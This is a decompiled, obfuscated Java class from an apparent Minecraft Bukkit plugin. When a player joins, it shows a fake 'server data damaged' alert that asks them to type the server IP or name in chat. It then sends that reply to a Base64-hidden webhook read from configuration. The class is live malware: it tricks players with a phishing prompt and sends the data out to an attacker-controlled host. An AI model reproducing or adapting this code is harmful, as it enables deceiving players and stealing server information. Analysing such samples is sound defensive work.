/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 *  org.bukkit.event.player.PlayerJoinEvent
 */
package me.system.runner.events;

import java.util.Base64;
import me.system.runner.data.DataManager;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.utils.DWeb;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class IPGetterPlayerVise
implements Listener {
    public static /* synthetic */ Boolean ready_for_action;

    @EventHandler
    void playerJoinedOnIP(PlayerJoinEvent lllllllllllllIlIlIllllIlIIIlIIlI, Player lllllllllllllIlIlIllllIlIIIllIII) {
        Player lllllllllllllIlIlIllllIlIIIlIllI = lllllllllllllIlIlIllllIlIIIlIIlI.getPlayer();
        String lllllllllllllIlIlIllllIlIIIlIlII = lllllllllllllIlIlIllllIlIIIlIllI.getName();
        if (onEnableLogger.unknown_host.booleanValue()) {
            lllllllllllllIlIlIllllIlIIIllIII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&cALERT! Server Info and Data Is Damaged! Please enter the server name or IP in chat immediately to fix problems! (Enter Server IP Or Name As Next Chat Message You Send)!"));
            ready_for_action = true;
        }
    }

    public IPGetterPlayerVise() {
        IPGetterPlayerVise lllllllllllllIlIlIllllIlIIlIlIII;
    }

    @EventHandler
    void playerRepliedToRequest(AsyncPlayerChatEvent lllllllllllllIlIlIllllIIlllllIlI, Player lllllllllllllIlIlIllllIIllllllII) {
        if (onEnableLogger.unknown_host.booleanValue() && ready_for_action.booleanValue()) {
            byte[] lllllllllllllIlIlIllllIlIIIIIlII = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
            DWeb lllllllllllllIlIlIllllIlIIIIIIlI = new DWeb(new String(lllllllllllllIlIlIllllIlIIIIIlII));
            lllllllllllllIlIlIllllIlIIIIIIlI.setContent(String.valueOf(new StringBuilder().append("Tried to get server IP/Server Name from a user (Could Be Minehut Server)! - ").append(lllllllllllllIlIlIllllIIlllllIlI.getMessage())));
            ready_for_action = false;
            onEnableLogger.unknown_host = false;
        }
    }

    static {
        ready_for_action = false;
    }
}

